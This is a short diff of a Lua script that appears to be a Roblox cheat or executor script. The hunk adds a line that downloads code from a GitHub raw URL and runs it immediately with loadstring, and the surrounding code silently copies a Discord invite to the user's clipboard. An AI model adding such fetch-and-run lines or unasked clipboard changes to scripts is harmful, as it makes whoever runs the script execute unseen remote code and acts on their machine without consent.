@@ -6,6 +6,8 @@
     })
     
     setclipboard("https://discord.gg/asnP9ZzmK5")
+    
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/LuxeCommands/L/main/e'))()
 
 if game.Players.LocalPlayer.Name == "Hax0963" then
 return
